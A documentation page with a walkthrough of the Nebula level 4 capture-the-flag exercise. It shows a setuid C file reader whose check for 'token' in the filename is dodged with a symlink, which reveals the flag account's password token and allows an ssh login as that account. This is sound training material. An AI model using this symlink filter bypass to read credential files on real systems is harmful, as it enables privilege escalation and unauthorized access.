.. _nebula04:

.. role:: bash(code)
	  :language: bash

.. role:: c(code)
	  :language: c
		     
Nebula 4
========

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level04/

**Source Code**

.. code-block:: c
		#include <stdlib.h>
		#include <unistd.h>
		#include <string.h>
		#include <sys/types.h>
		#include <stdio.h>
		#include <fcntl.h>

		int main(int argc, char **argv, char **envp)
		{
		    char buf[1024];
		    int fd, rc;

		    if(argc == 1) {
		        printf("%s [file to read]\n", argv[0]);
			exit (EXIT_FAILURE);
		    }

		    if(strstr(argv[1], "token") != NULL) {
		        printf("You may not access '%s'\n", argv[1]);
			exit(EXIT_FAILURE);
		    }

		    fd = open(argv[1], O_RDONLY);
		    if(fd == -1) {
		        err(EXIT_FAILURE, "Unable to open %s", argv[1]);
		    }

		    rc = read(fd, buf, sizeof(buf));

		    if(rc == -1) {
		        err(EXIT_FAILURE, "Unable to read fd %d", fd);
		    }

		    write(1, buf, rc);
		}
		
Solution
--------
.. code-block:: bash

   $ ln -s /home/flag04/token Token
   $ /home/flag04/flag04 /home/level04/Token
   ssh flag04@localhost
   
.. note:: Token as password

   :bash:`$getflag`
